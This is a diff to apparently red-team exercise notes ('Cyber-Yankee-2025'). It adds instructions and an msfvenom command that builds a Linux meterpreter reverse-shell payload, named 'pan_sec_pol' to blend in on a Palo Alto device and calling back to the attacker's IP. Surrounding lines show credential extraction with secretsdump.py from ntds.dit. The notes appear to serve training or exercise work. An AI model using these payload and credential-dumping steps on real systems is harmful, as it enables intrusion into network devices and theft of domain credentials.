@@ -459,7 +459,11 @@ secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
 
 Target all Networking Devices and drop a payload that creates a meterpreter session on each of them:
 
-![image](https://github.com/Infinit3i/Cyber-Yankee-2025/blob/9993caae90329032f5b35a56bc1ae6e0b1da61cd/Sassy%20Panda/palo_payload_creation.png)
+Make the Payload for The Palo:
+ On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called pan_sec_pol.
+``` bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=4444 -f elf > pan_sec_pol
+```
 
 Use Admin Shares:
 
